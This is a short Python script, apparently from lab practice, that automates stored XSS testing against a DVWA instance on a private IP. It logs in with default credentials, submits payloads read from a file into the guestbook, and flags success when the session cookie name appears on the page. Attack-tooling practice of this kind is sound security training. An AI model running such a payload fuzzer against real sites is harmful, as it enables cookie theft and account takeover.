from seleniumwire import webdriver
from bs4 import BeautifulSoup as bs

import requests

file = open("/root/dvwa/xss2","r")
inject = file.readlines()

browser = webdriver.Firefox()

LOGIN = "http://10.0.2.13:8080/login.php"
URL = "http://10.0.2.13:8080/vulnerabilities/xss_s/"

browser.get(LOGIN)
browser.find_element_by_name('username').send_keys('admin')
browser.find_element_by_name('password').send_keys('password')
browser.find_element_by_name('Login').click()

for i in inject:
    headers = {"Referer":URL,"Content-Type":"application/x-www-form-urlencoded"}
    session1 = requests.Session()
    cookie={
        "PHPSESSID":"4d4v36d8eindghvkdmct5oenb4",
        "security":"low"
    }
    clear = session1.post(URL,headers=headers,cookies=cookie,data="txtName=&mtxMessage=&btnClear=Clear+Guestbook")
    browser.get(URL)
    browser.find_element_by_name('txtName').send_keys('test')
    browser.find_element_by_name('mtxMessage').send_keys(i)
    browser.find_element_by_name('btnSign').click()
    html = browser.page_source
    soup = bs(html,'html.parser')
    vuln_area = soup.find('div',{'id':'guestbook_comments'})
    if(vuln_area.text.find("PHPSESSID")!=-1):
        print("\n\n")
        print("XSS Success!!  "+i)
        print("\n\n")
browser.close()
